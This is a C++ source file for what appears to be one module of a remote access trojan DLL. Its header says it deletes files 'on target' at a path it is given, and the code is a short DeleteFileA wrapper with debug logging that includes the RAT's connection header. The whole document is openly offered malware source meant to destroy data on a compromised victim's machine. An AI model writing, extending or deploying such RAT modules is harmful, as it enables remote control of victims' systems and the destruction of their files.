// Patrick Sacchet (@pjsacchet)
// Verison 1.0.
// RAT-Dll-DeleteFile.cpp : Defines functionality for performing a delete file on target, i.e., deleting a file off target at a specified path

#include "RAT-Dll-DeleteFile.h"
#include "RAT-Dll-Connect.h"


/** This function will perform a delete file for us
params:
* filePath - path to file on target we're deleting
return:
* if successful we return SUCCESS; otherwise print error code and handle appropiately
*/
INT performDeleteFile(__in char* filePath)
{
	INT status = SUCCESS;
	CHAR msgBuf[DEFAULT_BUF_LEN];

	sprintf_s(msgBuf, "RAT-Dll-DeleteFile::performDeleteFile - Deleting %s...\n", filePath);
	OutputDebugStringA(msgBuf);

	if (!DeleteFileA(filePath))
	{
		OutputDebugStringA("RAT-Dll-DeleteFile::performDeleteFile - Failed to delete file!\n");
		status = FAILURE;
		goto cleanup;
	}

	OutputDebugStringA("RAT-Dll-DeleteFile::performDeleteFile - Successfully deleted file!\n");

cleanup:
	return status;
}